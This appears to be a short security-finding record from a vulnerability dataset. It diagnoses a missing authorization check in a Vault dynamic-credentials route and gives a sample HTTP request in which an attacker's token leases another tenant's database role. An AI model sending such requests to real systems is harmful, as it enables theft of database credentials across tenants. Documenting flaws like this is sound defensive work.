diagnosis: The dynamic database credentials route requests Vault to generate ephemeral database credentials using role_name from the route parameter. It verifies current_user is authenticated but fails to verify that current_user has been assigned role_name. Any authenticated user can lease high-privilege credentials (such as dba-superuser or another tenant's dedicated database role).
exploit_request:
POST /infrastructure/db-roles/tenant_mega_corp_readonly/lease-credentials HTTP/1.1
Host: vault-mesh.infra.io
Authorization: Bearer <attacker_jwt>
Content-Length: 0
